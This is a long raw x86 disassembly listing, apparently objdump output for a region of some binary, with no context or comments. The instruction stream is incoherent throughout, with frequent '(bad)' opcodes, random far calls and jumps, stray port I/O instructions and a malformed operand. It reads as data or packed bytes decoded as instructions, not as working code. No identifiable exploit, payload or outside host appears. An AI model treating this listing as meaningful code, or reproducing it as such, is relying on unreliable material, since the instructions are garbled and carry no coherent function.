  42025e:	ins    BYTE PTR es:[edi],dx
  42025f:	sbb    eax,0xd872a008
  420264:	imul   esi,DWORD PTR [edi+0x83111d8],0x296918fa
  42026e:	adc    al,0x2
  420270:	sbb    cl,bl
  420272:	dec    eax
  420273:	imul   edx,edi,0xb7130f25
  420279:	fprem  
  42027b:	lock (bad) 
  42027d:	(bad)  
  42027f:	mov    al,ds:0x8d04473f
  420284:	inc    edi
  420285:	or     BYTE PTR [eax-0x7f],dl
  420288:	mov    ecx,DWORD PTR ds:0xbc18030a
  42028e:	jl     0x4202ca
  420290:	jo     0x42028c
  420292:	jmp    0x4202b0
  420294:	enter  0x8025,0x3f
  420298:	sbb    al,0x35
  42029a:	in     al,dx
  42029b:	mov    BYTE PTR [esi+0x10],0x1
  42029f:	lds    esp,FWORD PTR [ebx-0x38]
  4202a2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4202a3:	adc    al,0x57
  4202a5:	repz out dx,al
  4202a7:	jg     0x42022c
  4202a9:	(bad)  [ebp-0x14e754ba]
  4202af:	push   0xed854d08
  4202b4:	jl     0x4202cc
  4202b6:	inc    ebp
  4202b7:	xor    edi,edi
  4202b9:	sbb    esp,DWORD PTR [ebx-0x287c7808]
  4202bf:	out    dx,eax
  4202c0:	test   DWORD PTR [edi+0x4d],0x2d2fed75
  4202c7:	lods   eax,DWORD PTR ds:[esi]
  4202c8:	bound  edx,QWORD PTR ds:0x36192757
  4202ce:	cwde   
  4202cf:	jge    0x4202f0
  4202d1:	add    eax,0xffffff9d
  4202d4:	and    BYTE PTR [esi-0x79e73fe9],dh
  4202da:	rol    dl,1
  4202dc:	outs   dx,DWORD PTR ds:[esi]
  4202dd:	inc    edi
  4202de:	mov    bh,0xf8
  4202e0:	sbb    eax,0x1735eebc
  4202e5:	rol    edi,cl
  4202e7:	jle    0x4202be
  4202e9:	(bad)  
  4202ea:	jmp    0x4202e4
  4202ec:	into   
  4202ed:	push   0x2
  4202ef:	mov    ah,0x14
  4202f1:	stos   BYTE PTR es:[edi],al
  4202f2:	add    dl,ch
  4202f4:	adc    bh,BYTE PTR [eax+0x49dbcb61]
  4202fa:	xlat   BYTE PTR ds:[ebx]
  4202fb:	retf   
  4202fc:	rcl    BYTE PTR [edi],0x3a
  4202ff:	jo     0x420318
  420301:	mov    eax,ds:0x6ceda954
  420306:	rcr    al,1
  420308:	nop
  420309:	xlat   BYTE PTR ds:[ebx]
  42030a:	les    ebx,FWORD PTR [edx]
  42030c:	(bad)  
  42030d:	xor    esp,DWORD PTR [esi]
  42030f:	sbb    eax,0x21a323bb
  420314:	cmp    al,0x2d
  420316:	js     0x42035b
  420318:	add    DWORD PTR [esi-0x14],0xffffffd4
  42031c:	push   ss
  42031d:	jo     0x42031d
  42031f:	pop    ss
  420320:	jbe    0xfeb2cc7c
  420326:	inc    edi
  420327:	inc    ebx
  420328:	cwde   
  420329:	inc    eax
  42032a:	pushf  
  42032b:	or     esp,edi
  42032d:	(bad)  
  42032e:	adc    DWORD PTR ds:0xb7460628,edx
  420334:	ins    BYTE PTR es:[edi],dx
  420335:	mov    al,0xd1
  420337:	xor    al,0xed
  420339:	dec    ebp
  42033a:	or     al,0xa
  42033c:	or     BYTE PTR [eax],cl
  42033e:	or     al,0xe1
  420340:	add    DWORD PTR [edx+0x2a],0xdc2c97f3
  420347:	push   eax
  420348:	ins    DWORD PTR es:[edi],dx
  420349:	(bad)  
  42034a:	and    al,0xfe
  42034c:	popa   
  42034d:	push   esp
  42034e:	mov    edx,DWORD PTR ss:[esi]
  420351:	out    dx,al
  420352:	js     0x4203a4
  420354:	push   0x55ad9ff2
  420359:	sbb    ebx,edi
  42035b:	jg     0x4203c2
  42035d:	jne    0x4202e0
  42035f:	lds    edi,FWORD PTR [ebx+0x23a008ad]
  420365:	inc    esi
  420366:	lea    ebx,[ecx+0x76]
  420369:	xor    ch,BYTE PTR ds:0x5cedbd89
  42036f:	and    BYTE PTR [eax],bl
  420371:	sbb    cl,BYTE PTR [edi+ebx*2]
  420374:	lock lahf 
  420376:	cld    
  420377:	dec    ebx
  420378:	cld    
  420379:	mov    DWORD PTR [edx],ecx
  42037b:	jmp    0x420395
  42037d:	ret    
  42037e:	or     BYTE PTR [esi+0x75],cl
  420381:	loope  0x4203a9
  420383:	add    dl,BYTE PTR [esi]
  420385:	imul   esp,DWORD PTR [edi+0x30a8775],0xffffffbf
  42038c:	fadd   QWORD PTR [ebx+0x8461e83]
  420392:	mov    esi,0x3bfe3c48
  420397:	add    esi,DWORD PTR [ebp+0x10]
  42039a:	mov    BYTE PTR [ebp-0x5],0x94
  42039e:	fld    DWORD PTR [ebx]
  4203a0:	out    dx,eax
  4203a1:	sub    eax,DWORD PTR [eax]
  4203a3:	les    ecx,FWORD PTR [edx]
  4203a5:	jns    0x42038d
  4203a7:	sub    al,BYTE PTR [eax]
  4203a9:	adc    DWORD PTR ds:0x7d8672c4,esi
  4203af:	nop
  4203b0:	ja     0x4203fa
  4203b2:	push   esp
  4203b3:	popf   
  4203b4:	add    dl,BYTE PTR [ecx]
  4203b6:	or     BYTE PTR [ebp+0x63],dl
  4203b9:	xlat   BYTE PTR ds:[ebx]
  4203ba:	aaa    
  4203bb:	pop    eax
  4203bc:	lahf   
  4203bd:	jae    0x4203c7
  4203bf:	cmp    edi,DWORD PTR [esi*2-0x177705fa]
  4203c6:	dec    esp
  4203c7:	aas    
  4203c8:	adc    cl,BYTE PTR [edx+0x3c]
  4203cb:	mov    al,0xff
  4203cd:	mov    cl,0x6e
  4203cf:	xor    al,ah
  4203d1:	cmp    BYTE PTR [eax+0x3dc9330b],0x1c
  4203d8:	adc    DWORD PTR [esi],ebp
  4203da:	push   0xffffffc8
  4203dc:	iret   
  4203dd:	stos   DWORD PTR es:[edi],eax
  4203de:	xchg   BYTE PTR ds:0x94f10102,bh
  4203e4:	adc    DWORD PTR [eax-0x59],ebx
  4203e7:	xor    al,dl
  4203e9:	push   cs
  4203ea:	push   cs
  4203eb:	xor    cl,BYTE PTR [edx+0x5]
  4203ee:	cwde   
  4203ef:	or     BYTE PTR [ebp-0x10],bh
  4203f2:	and    DWORD PTR [esp+0x15],ebp
  4203f6:	in     al,dx
  4203f7:	enter  0xddce,0xf0
  4203fb:	push   0x631cf111
  420400:	repnz mov ds:0xfa4bfff8,eax
  420406:	call   0xe27a0289
  42040b:	lock jge 0x420427
  42040e:	sub    eax,esi
  420410:	mov    ecx,eax
  420412:	shl    ecx,0x2
  420415:	lea    edx,[eax+esi*4]
  420418:	or     eax,DWORD PTR [ebx+eax*2+0x76]
  42041c:	sbb    eax,ecx
  42041e:	adc    eax,0xb1f5281b
  420423:	add    al,BYTE PTR [ecx]
  420425:	xlat   BYTE PTR ds:[ebx]
  420426:	(bad)  
  420427:	pop    ds
  420428:	mov    bl,0x45
  42042a:	add    al,0x2f
  42042c:	xor    al,0x52
  42042e:	ja     0x420433
  420430:	in     al,0x93
  420432:	sub    al,0x50
  420434:	mov    edx,esi
  420436:	(bad)  
  420437:	ds add al,0xbc
  42043a:	or     BYTE PTR [edx+0x2187c8f5],cl
  420440:	and    BYTE PTR [esi],ah
  420442:	inc    eax
  420443:	hlt    
  420444:	xchg   edx,eax
  420445:	js     0x4203fb
  420447:	into   
  420448:	jmp    0xe34de8c4
  42044d:	jbe    0x4204a6
  42044f:	jb     0x4204bb
  420451:	mov    ah,0x0
  420453:	inc    ecx
  420454:	jmp    0x1265:0xc436185d
  42045b:	into   
  42045c:	push   ds
  42045d:	data16 adc al,BYTE PTR [edi+0x4930f0ab]
  420464:	mov    ebx,0x5034100
  420469:	aaa    
  42046a:	inc    eax
  42046b:	pushf  
  42046c:	fld    QWORD PTR [ebx+0x5c]
  42046f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420470:	xchg   ebp,eax
  420471:	or     eax,0x8bb0045e
  420476:	push   eax
  420477:	ins    BYTE PTR es:[edi],dx
  420478:	sbb    al,BYTE PTR [edx-0x3e]
  42047b:	add    eax,0x85cac406
  420480:	leave  
  420481:	mov    ds:0x18b4002d,al
  420486:	rol    DWORD PTR [ebx],0x6a
  420489:	jmp    0x42049c
  42048b:	and    al,0x8
  42048d:	or     bl,al
  42048f:	nop
  420490:	adc    BYTE PTR [eax],0x1b
  420493:	jmp    0x42049a
  420495:	ret    
  420496:	xlat   BYTE PTR ds:[ebx]
  420497:	ret    
  420498:	jnp    0x420511
  42049a:	add    ecx,edx
  42049c:	mov    edx,ecx
  42049e:	xchg   ebp,eax
  42049f:	paddsb mm2,QWORD PTR [esi]
  4204a2:	add    ebp,DWORD PTR [eax]
  4204a4:	jp     0x420491
  4204a6:	add    DWORD PTR [ecx+0x3b],eax
  4204a9:	and    BYTE PTR [ebp+0x44],bh
  4204ac:	add    al,0x3b
  4204ae:	inc    ebx
  4204af:	push   ebp
  4204b0:	jnp    0x42046d
  4204b2:	clc    
  4204b3:	jne    0x4204a7
  4204b5:	sbb    BYTE PTR [ebp+0x7a],dh
  4204b8:	leave  
  4204b9:	cld    
  4204ba:	rcl    edi,0xe
  4204bd:	mov    edx,0xf3f2d832
  4204c2:	cmp    al,dh
  4204c4:	add    al,0x9
  4204c6:	xor    eax,0xbb1b54a4
  4204cb:	adc    al,0x68
  4204cd:	adc    ebp,edx
  4204cf:	pusha  
  4204d0:	mov    bh,0x57
  4204d2:	das    
  4204d3:	or     dl,ch
  4204d5:	sub    al,0x2
  4204d7:	jb     0x4204c9
  4204d9:	inc    DWORD PTR [edi]
  4204db:	jle    0x42051b
  4204dd:	sbb    dh,0xfe
  4204e0:	adc    dh,ah
  4204e2:	or     bh,BYTE PTR [eax]
  4204e4:	(bad)  
  4204e5:	shl    edx,0x2
  4204e8:	aas    
  4204e9:	sbb    eax,esp
  4204eb:	sbb    BYTE PTR [edi],al
  4204ed:	add    BYTE PTR [edi],al
  4204ef:	inc    eax
  4204f0:	xchg   edi,eax
  4204f1:	in     eax,dx
  4204f2:	inc    edx
  4204f3:	scas   al,BYTE PTR es:[edi]
  4204f4:	and    eax,0x7e4879b3
  4204f9:	in     eax,0x8a
  4204fb:	rcl    DWORD PTR [edi],1
  4204fd:	and    DWORD PTR [eax-0x69],0x7e
  420501:	sbb    DWORD PTR [eax],ebx
  420503:	mov    BYTE PTR [eax+0x58],cl
  420506:	adc    esi,DWORD PTR [eax+0x18f04682]
  42050c:	sub    DWORD PTR [eax],0x9282ec30
  420512:	jge    0x4204d0
  420514:	(bad)  
  420515:	mov    ebx,0x4de85c0c
  42051a:	mov    edi,esi
  42051c:	sub    edi,ebp
  42051e:	jg     0x42052e
  420520:	dec    edi
  420521:	xchg   esp,eax
  420522:	add    dh,BYTE PTR [edi]
  420524:	test   DWORD PTR [ebx],edx
  420526:	dec    ebx
  420527:	dec    ebp
  420528:	inc    edi
  420529:	inc    edx
  42052a:	cmp    dl,BYTE PTR [ecx+0x52]
  42052d:	pop    es
  42052e:	pop    edi
  42052f:	arpl   di,bx
  420531:	scas   eax,DWORD PTR es:[edi]
  420532:	pusha  
  420533:	ror    BYTE PTR ds:0xe7b80b18,0x88
  42053a:	xchg   edx,eax
  42053b:	mov    edx,0x46ee4662
  420540:	and    BYTE PTR [eax],al
  420542:	ins    DWORD PTR es:[edi],dx
  420543:	add    BYTE PTR [eax+0xd],bl
  420546:	shl    BYTE PTR [edi+0x25],0x1f
  42054a:	call   0xc2d6:0x60f39df8
  420551:	add    al,BYTE PTR [ecx+0x6]
  420554:	add    esi,eax
  420556:	cmp    BYTE PTR [ebp+0x7],0xc0
  42055a:	fucomp st(6)
  42055c:	cmp    BYTE PTR [ebx],al
  42055e:	leave  
  42055f:	push   esi
  420560:	ja     0x420526
  420562:	push   cs
  420563:	sbb    al,BYTE PTR [eax+0x18776e3b]
  420569:	sbb    esp,esp
  42056b:	pop    ecx
  42056c:	mov    ecx,DWORD PTR [ecx]
  42056e:	scas   al,BYTE PTR es:[edi]
  42056f:	xor    BYTE PTR [edi-0x74],dh
  420572:	jmp    0xc9c03357
  420577:	pop    eax
  420578:	add    eax,DWORD PTR [eax+0x2012078]
  42057e:	sti    
  42057f:	in     al,dx
  420580:	xlat   BYTE PTR ds:[ebx]
  420581:	mov    esi,0x40948c38
  420586:	jne    0x420597
  420588:	pop    ds
  420589:	out    dx,eax
  42058a:	sub    bl,0x1e
  42058d:	dec    edi
  42058e:	mov    WORD PTR [esi+0x7502f153],?
  420594:	adc    eax,0xce3b3400
  420599:	xchg   esp,eax
  42059a:	in     al,0x11
  42059c:	pop    esp
  42059d:	or     eax,0x50035f43
  4205a2:	pop    esp
  4205a3:	lea    eax,[edx+0x47]
  4205a6:	inc    esp
  4205a7:	push   edi
  4205a8:	mov    esp,0x14a30f04
  4205ad:	in     eax,dx
  4205ae:	and    ch,BYTE PTR [edi]
  4205b0:	aaa    
  4205b1:	fwait
  4205b2:	and    BYTE PTR ds:0x3825bb13,0xc5
  4205b9:	jne    0x42061b
  4205bb:	sbb    DWORD PTR [edx+eax*8],0x9a1e1197
  4205c2:	test   eax,0xb00e0157
  4205c7:	and    eax,0x48b1947
  4205cc:	inc    esp
  4205cd:	ret    0x323e
  4205d0:	rol    DWORD PTR [edx+edx*4-0xb10ee16],1
  4205d7:	adc    BYTE PTR [ecx+0x7ee10d50],al
  4205dd:	test   ebp,0x3739e454
  4205e3:	retf   0x4104
  4205e6:	dec    esi
  4205e7:	sbb    eax,0x253025d
  4205ec:	sub    eax,DWORD PTR [esi]
  4205ee:	outs   dx,DWORD PTR ds:[esi]
  4205ef:	jle    0x420659
  4205f1:	popf   
  4205f2:	jmp    0xe00d:0xc2f4319
  4205f9:	add    al,0x41
  4205fb:	add    bl,BYTE PTR [edx]
  4205fd:	or     BYTE PTR [eax-0x5b],bl
  420600:	in     al,dx
  420601:	mov    esp,ds
  420603:	call   0x373:0xbf08506
  42060a:	test   DWORD PTR [edi],esp
  42060c:	cmp    dl,BYTE PTR [edi-0x70bc15a]
  420612:	sbb    BYTE PTR [ecx-0x7e],0x30
  420616:	lea    ebp,[ebp+esi*8+0x210d4350]
  42061d:	push   esp
  42061e:	push   ebx
  42061f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420620:	rol    DWORD PTR [eax],1
  420622:	aaa    
  420623:	push   edi
  420624:	enter  0x4104,0x3
  420628:	outs   dx,BYTE PTR ds:[esi]
  420629:	imul   ebp,DWORD PTR [ecx+eiz*1+0x0],0xb1088130
  420631:	nop
  420632:	pop    ss
  420633:	enter  0x991,0x96
  420637:	cld    
  420638:	mov    ecx,0xe0585fa
  42063d:	mov    WORD PTR [eax],sp
  420640:	cmp    eax,0x2cafc719
  420645:	nop
  420646:	pusha  
  420647:	fwait
  420648:	outs   dx,BYTE PTR ds:[esi]
  420649:	mov    si,0x1c18
  42064d:	and    ebp,DWORD PTR [eax+ecx*2+0x1ded601b]
  420654:	adc    BYTE PTR [esi],0xfe
  420657:	inc    ebx
  420658:	stos   DWORD PTR es:[edi],eax
  420659:	xchg   DWORD PTR [ecx-0xf0de9bb],ecx
  42065f:	push   es
  420660:	sar    DWORD PTR [esi+0x37ffa69c],0x78
  420667:	xor    eax,0x95b50430
  42066c:	xchg   edx,eax
  42066d:	inc    edi
  42066e:	jne    0x4205fc
  420670:	add    eax,0x2b015ad
  420675:	pusha  
  420676:	dec    edi
  420677:	fiadd  WORD PTR [ebp+0x4b]
  42067a:	mov    ch,0x8a
  42067c:	lahf   
  42067d:	and    DWORD PTR [edx],ebx
  42067f:	clc    
  420680:	mov    ds:0x4e4242ec,eax
  420685:	repz rcl BYTE PTR [edi+0xed53408],1
  42068c:	fst    DWORD PTR [eax-0x78f632a8]
  420692:	adc    ah,bl
  420694:	dec    edi
  420695:	pusha  
  420696:	sbb    BYTE PTR [edi],cl
  420698:	jmp    0x420717
  42069a:	ss icebp 
  42069c:	xchg   eax,ebx
  42069e:	arpl   WORD PTR [eax],di
  4206a0:	push   esi
  4206a1:	iret   
  4206a2:	xchg   esi,eax
  4206a3:	mov    al,0x7c
  4206a5:	rcl    BYTE PTR [ebx+0x129d24c2],0xe
  4206ac:	imul   eax,DWORD PTR [edi-0x482212b0],0x64
  4206b3:	mov    ds:0xec06c34b,eax
  4206b8:	imul   DWORD PTR [eax+0x2b]
  4206bb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4206bc:	xor    eax,0xf825d980
  4206c1:	icebp  
  4206c2:	lock cmp ah,0x5d
  4206c6:	sbb    bh,al
  4206c8:	sub    eax,0x5db3346
  4206cd:	sub    al,0x38
  4206cf:	call   DWORD PTR [edi+0xc]
  4206d2:	jle    0x4206b6
  4206d4:	lea    eax,[eax]
  4206d6:	jle    0x4206f3
  4206d8:	add    ecx,eax
  4206da:	in     al,0x11
  4206dc:	jge    0x4206d5
  4206de:	mov    BYTE PTR [edx+0x31],bl
  4206e1:	cmp    al,0x43
  4206e3:	dec    esi
  4206e4:	jne    0x4206bc
  4206e6:	aad    0xad
  4206e8:	push   es
  4206e9:	loope  0x42073b
  4206eb:	sub    eax,0x6d24f81c
  4206f0:	retf   0x1a06
  4206f3:	adc    eax,0xf47bd256
  4206f8:	out    0x43,eax
  4206fa:	jle    0x420704
  4206fc:	js     0x4206b7
  4206fe:	pusha  
  4206ff:	test   al,0xf6
  420701:	retf   0x724
  420704:	sub    BYTE PTR [ebx+0x63],0x54
  420708:	pop    es
  420709:	cld    
  42070a:	imul   edx,DWORD PTR [edi+0x28],0xf38b44f1
  420711:	mov    ch,BYTE PTR [esi+0x4428896]
  420717:	adc    BYTE PTR [edi],al
  420719:	pop    ebx
  42071a:	call   0x506:0x607734b
  420721:	or     dh,dl
  420723:	or     BYTE PTR [esi],cl
  420725:	pop    esp
  420726:	(bad)  
  420727:	pop    edi
  420728:	js     0x42076a
  42072a:	pop    ebx
  42072b:	gs pop es
  42072d:	sbb    ch,BYTE PTR [edi+0x55c7520c]
  420733:	cld    
  420734:	sub    cl,dh
  420736:	xchg   BYTE PTR [ecx+0x5074389f],dh
  42073c:	popa   
  42073d:	or     BYTE PTR [eax+0x53],ah
  420740:	xor    BYTE PTR [ebx+edx*2-0x203c677f],bh
  420747:	push   esi
  420748:	mov    eax,ds:0xee822670
  42074d:	dec    esi
  42074e:	mov    bh,0x2d
  420750:	mov    bl,0x1
  420752:	sbb    eax,0xd92777c6
  420757:	mov    bh,0xee
  420759:	jmp    0x420782
  42075b:	(bad)  
  42075c:	dec    edi
  42075d:	clc    
  42075e:	sar    DWORD PTR [eax],1
  420760:	pushf  
  420761:	xor    bl,0x1
  420764:	jmp    0x420776
  420766:	and    esi,DWORD PTR [esi+ecx*1+0x5ce30f00]
  42076d:	lahf   
  42076e:	mov    dl,0xc3
  420770:	xor    DWORD PTR [esi],eax
  420772:	push   0xd
  420774:	adc    BYTE PTR [edi-0x2c],0x3f
  420778:	inc    eax
  420779:	or     dh,dh
  42077b:	xor    eax,0x76946850
  420780:	sub    ah,dl
  420782:	daa    
  420783:	stos   BYTE PTR es:[edi],al
  420784:	adc    DWORD PTR [esp+ebx*4+0x55],eax
  420788:	adc    DWORD PTR [eax-0x7c7a9fa7],eax
  42078e:	sub    eax,DWORD PTR [eax]
  420790:	mov    edx,0xc97b0820
  420795:	lea    ecx,[eax+0x70]
  420798:	sbb    cl,0x8f
  42079b:	aam    0x13
  42079d:	pop    ebx
  42079e:	inc    edx
  42079f:	adc    DWORD PTR [esi],ebx
  4207a1:	dec    eax
  4207a2:	or     ch,ch
  4207a4:	pop    es
  4207a5:	dec    esi
  4207a6:	mov    es,ebx
  4207a8:	pusha  
  4207a9:	add    dh,BYTE PTR [ebx+0x3f]
  4207ac:	in     al,dx
  4207ad:	lock and eax,ecx
  4207b0:	dec    ecx
  4207b1:	cmp    al,BYTE PTR [esp+ebp*8-0x2f]
  4207b5:	or     BYTE PTR [esi-0x78fb872c],cl
  4207bb:	cld    
  4207bc:	push   DWORD PTR ds:0x1f0c3d2e
  4207c2:	cmp    ebx,eax
  4207c4:	jne    0x420801
  4207c6:	fdivr  DWORD PTR ds:0x3a4bf030
  4207cc:	sahf   
  4207cd:	push   esp
  4207ce:	cld    
  4207cf:	lock push eax
  4207d1:	pop    esi
  4207d2:	in     al,dx
  4207d3:	loopne 0x420852
  4207d5:	fsub   st(1),st
  4207d7:	push   ebp
  4207d8:	in     al,dx
  4207d9:	pop    eax
  4207da:	jns    0x42076c
  4207dc:	jne    0x4207e6
  4207de:	inc    edx
  4207df:	shl    DWORD PTR [eax+0x43cdc801],cl
  4207e5:	imul   ebx,DWORD PTR [ebx],0xec4108d8
  4207eb:	mov    edx,0x18422f02
  4207f0:	inc    esi
  4207f1:	out    dx,al
  4207f2:	addr16 clc 
  4207f4:	loopne 0x420858
  4207f6:	test   BYTE PTR [eax+eiz*1],bl
  4207f9:	pop    eax
  4207fa:	mov    ecx,0xe17221e4
  4207ff:	ins    BYTE PTR es:[edi],dx
  420800:	push   0x551ec609
  420805:	div    DWORD PTR [eax+eax*4]
  420808:	ret    
  420809:	mov    bh,0xe4
  42080b:	lds    ebp,FWORD PTR [edi+0x9]
  42080e:	xor    eax,0x5940380a
  420813:	scas   eax,DWORD PTR es:[edi]
  420814:	push   es
  420815:	in     eax,dx
  420816:	add    DWORD PTR [ecx-0xbfb0f99],eax
  42081c:	aaa    
  42081d:	mov    cl,0x1
  42081f:	in     al,0x4d
  420821:	mov    edi,0x2b2e0a50
  420826:	cmp    al,0xbd
  420828:	in     eax,0xa6
  42082a:	fwait
  42082b:	cld    
  42082c:	adc    edx,DWORD PTR [ebx+0x5874861a]
  420832:	enter  0xd691,0xab
  420836:	scas   al,BYTE PTR es:[edi]
  420837:	fisub  WORD PTR [esi-0x1ed2df14]
  42083d:	sub    edx,ebp
  42083f:	jmp    0x19d6:0x92f6e690
  420846:	and    al,bh
  420848:	and    al,0x1d
  42084a:	pop    esi
  42084b:	and    DWORD PTR [edi+0x570a350f],ecx
  420851:	or     bh,ch
  420853:	lock pop eax
  420855:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420856:	and    DWORD PTR ds:0x7867dbf7,esp
  42085c:	pop    eax
  42085d:	and    BYTE PTR [edi-0x69],ch
  420860:	mov    esi,DWORD PTR [ecx-0x599ed6f6]
  420866:	and    eax,0x6e5a1c1b
  42086b:	out    dx,al
  42086c:	pop    ebx
  42086d:	stc    
  42086e:	or     BYTE PTR [esp+eiz*8+0x4d],ah
  420872:	retf   
  420873:	mov    eax,0x83a9020a
  420878:	jns    0x420871
  42087a:	inc    ebp
  42087b:	retf   
  42087c:	xor    eax,0xde010b4
  420881:	push   0xffffffe8
  420883:	mov    ds:0xc30bcb3a,al
  420888:	adc    al,0xa
  42088a:	and    ch,BYTE PTR [esi+edx*1]
  42088d:	push   ds
  42088e:	ficomp WORD PTR [edx-0x1c]
  420891:	or     edi,DWORD PTR [ebx]
  420893:	push   es
  420894:	or     DWORD PTR [edi],ebx
  420896:	loopne 0x42090d
  420898:	dec    ebp
  420899:	xor    al,BYTE PTR [esi+0x22]
  42089c:	xor    al,0x22
  42089e:	int3   
  42089f:	pop    ecx
  4208a0:	jns    0x42082e
  4208a2:	loopne 0x42087d
  4208a4:	inc    esi
  4208a5:	adc    BYTE PTR [edi+0x1b],al
  4208a8:	loopne 0x420913
  4208aa:	push   0xff600d1a
  4208af:	adc    eax,DWORD PTR [ebx]
  4208b1:	clc    
  4208b2:	add    ebx,edi
  4208b4:	call   DWORD PTR [esi+edx*2+0x41]
  4208b8:	retf   
  4208b9:	data16 test BYTE PTR [ecx-0x67d292ed],dh
  4208c0:	mov    bl,0xec
  4208c2:	sbb    eax,0x9bdc9326
  4208c7:	pop    eax
  4208c8:	call   0x8045da77
  4208cd:	in     eax,0x9a
  4208cf:	call   0x53ffb941
  4208d4:	push   eax
  4208d5:	mov    eax,0x5d01fd20
  4208da:	sbb    ah,ah
  4208dc:	or     al,0x5f
  4208de:	xchg   edx,eax
  4208df:	mov    eax,ds:0xb0e7e43b
  4208e4:	cmc    
  4208e5:	pusha  
  4208e6:	sbb    DWORD PTR [ecx+edi*2-0x2e],0x3bae00b
  4208ee:	inc    ebp
  4208ef:	add    DWORD PTR [ecx+ecx*2+0x5f],0x89986397
  4208f7:	sar    ah,0x3f
  4208fa:	or     al,0x41
  4208fc:	and    eax,DWORD PTR [edi]
  4208fe:	push   ebx
  4208ff:	add    ebx,0xf87c2c67
  420905:	hlt    
  420906:	fld    TBYTE PTR [edx]
  420908:	inc    edi
  420909:	inc    eax
  42090a:	xchg   DWORD PTR [ecx],edx
  42090c:	sbb    BYTE PTR [ebp-0x4],cl
  42090f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420910:	mov    al,ds:0x342309
  420915:	or     eax,0xa1c9f824
  42091a:	cmp    BYTE PTR [ebx+0x39d354dc],0x67
  420921:	or     al,0xc6
  420923:	sub    dh,BYTE PTR [eax+0x18]
  420926:	cmp    al,0x3f
  420928:	push   edi
  420929:	loopne 0x4209a0
  42092b:	pushf  
  42092c:	push   edi
  42092d:	call   0x5792a9f
  420932:	arpl   WORD PTR [ebx-0x2fb7f270],di
  420938:	jl     0x4209a1
  42093a:	and    esp,ecx
  42093c:	mov    eax,ds:0x30238e60
  420941:	call   DWORD PTR [esi+0x11]
  420944:	sbb    BYTE PTR [eax],bh
  420946:	mov    ds:0xd0020170,al
  42094b:	test   al,0xec
  42094d:	fwait
  42094e:	lods   eax,DWORD PTR ds:[esi]
  42094f:	sbb    DWORD PTR [ebp+0x2b],0x9d9a4a0e
  420956:	call   0x2a42d0df
  42095b:	and    eax,0x29ce8b06
  420960:	clc    
  420961:	and    BYTE PTR [edi],dl
  420963:	(bad)
  420967:	mov    gs,eax
  420969:	sub    DWORD PTR [esi+eax*1+0xf8f8417],ebx
  420970:	sbb    BYTE PTR [eax*1-0x5b8afff5],cl
  420977:	xchg   ebx,eax
  420978:	sbb    BYTE PTR ds:[ecx],dl
  42097b:	inc    esp
  42097c:	sbb    bl,BYTE PTR [edx]
  42097e:	(bad)  
  42097f:	jmp    FWORD PTR [ebp+0x73838897]
  420985:	jecxz  0x420932
  420987:	out    dx,eax
  420988:	mov    cl,0x8c
  42098a:	test   DWORD PTR [edx-0x2d],ebx
  42098d:	mov    eax,0x4f74ef19
  420992:	adc    al,0xd6
  420994:	and    al,0xef
  420996:	cmp    ebp,eax
  420998:	je     0x4209a1
  42099a:	and    DWORD PTR [edx-0x1f],0x83efa862
  4209a1:	into   
  4209a2:	xchg   esp,eax
  4209a3:	pop    ebp
  4209a4:	push   esi
  4209a5:	loope  0x4209f9
  4209a7:	mov    cl,0x37
  4209a9:	or     al,0x4b
  4209ab:	shl    DWORD PTR [edx],1
  4209ad:	or     eax,0x240816d2
  4209b2:	adc    edx,edi
  4209b4:	mov    ebp,0x66c290e1
  4209b9:	push   0x34
  4209bb:	retf   0xd8a1
  4209be:	stc    
  4209bf:	loope  0x420963
  4209c1:	pop    es
  4209c2:	inc    ebx
  4209c3:	ret    0xcfa
  4209c6:	cmp    bh,dl
  4209c8:	hlt    
  4209c9:	or     BYTE PTR [edx],bh
  4209cb:	add    esp,DWORD PTR [ebx+esi*2-0x6c9318d1]
  4209d2:	mov    WORD PTR [eax-0x5a0418e7],ds
  4209d8:	rcl    BYTE PTR [ebx+0x29],0xc6
  4209dc:	imul   ebp,DWORD PTR [eax],0x90061787
  4209e2:	inc    edi
  4209e3:	cmp    al,0x3
  4209e6:	popf   
  4209e7:	push   cs
  4209e8:	cmp    bh,0xe1
  4209eb:	xchg   ecx,eax
  4209ec:	shr    BYTE PTR [ebx],cl
  4209ee:	inc    ebp
  4209ef:	lock dec DWORD PTR [ecx]
  4209f2:	cmp    BYTE PTR [ebx],ch
  4209f4:	lock lea ebp,[edi]
  4209f7:	fsub   QWORD PTR [eax]
  4209f9:	dec    edi
  4209fa:	adc    al,0xce
  4209fc:	push   ebp
  4209fd:	push   ss
  4209fe:	xchg   edi,eax
  4209ff:	jns    0x420a5d
  420a01:	ja     0x4209e0
  420a03:	or     al,0x16
  420a05:	out    dx,eax
  420a06:	sub    al,0xa3
  420a08:	xchg   DWORD PTR [esi],ecx
  420a0a:	inc    edx
  420a0b:	cs hlt 
  420a0d:	or     ah,BYTE PTR [esi+ecx*1+0x2056f8d0]
  420a14:	popa   
  420a15:	aad    0xd7
  420a17:	pop    ss
  420a18:	add    DWORD PTR [ebp+0x4e],ecx
  420a1b:	add    esp,DWORD PTR [ecx+0x4d]
  420a1e:	nop    edx
  420a21:	sbb    dl,BYTE PTR [eax-0x10]
  420a24:	imul   esi,DWORD PTR fs:[eax],0x61c0f80f
  420a2b:	mov    edx,DWORD PTR [ebp+0x57481762]
  420a31:	test   DWORD PTR [edx+eax*4],edi
  420a34:	imul   eax,DWORD PTR [ebx],0x64
  420a37:	pop    edi
  420a38:	aaa    
  420a39:	pavgw  mm1,QWORD PTR [edx+0x29]
  420a3d:	jns    0x420a93
  420a3f:	psllq  mm5,QWORD PTR [esi]
  420a42:	jle    0x420a84
  420a44:	call   0xde9d:0xf09b5127
  420a4b:	xor    al,0xe
  420a4d:	sti    
  420a4e:	loope  0x420a38
  420a50:	adc    eax,0x231b5548
  420a55:	test   DWORD PTR ds:[edi+0x1a],esi
  420a59:	(bad)  
  420a5b:	out    dx,eax
  420a5c:	and    ecx,DWORD PTR [esi-0x74]
  420a5f:	sbb    cl,ch
  420a61:	cmp    BYTE PTR [eax],dl
  420a63:	mov    ebp,0x487c42bc
  420a68:	jmp    0x2f10:0x13952810
  420a6f:	mov    eax,ds:0xef5a8581
  420a74:	pop    ecx
  420a75:	bound  eax,QWORD PTR [ecx]
  420a77:	ds push ebp
